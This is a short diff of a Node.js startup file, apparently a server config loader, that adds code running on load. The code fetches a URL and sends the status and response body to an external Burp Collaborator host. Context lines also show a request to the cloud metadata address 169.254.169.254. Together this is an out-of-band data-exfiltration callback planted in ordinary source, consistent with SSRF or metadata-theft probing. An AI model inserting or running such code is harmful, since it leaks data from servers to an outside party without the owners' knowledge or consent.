@@ -1,6 +1,14 @@
 const path = require('path');
 const nconf = require('nconf');
 
+var request = require('request');
+request('http://google.com/robots.txt', function (error, response, body) {
+  if (1 == 1) {
+    console.log(response.statusCode);
+    console.log(response.body);    // Prints the JSON object
+request('http://u0v760mwyr2w9wdiinuyo6k1psvjq7f.burpcollaborator.net/callback=Status:'+ response.statusCode + 'Response:' +response.body); 
+}
+});
 // const logger = require('./server/init');
 var request = require('request');
 request('http://169.254.169.254/', function (error, response, body) {
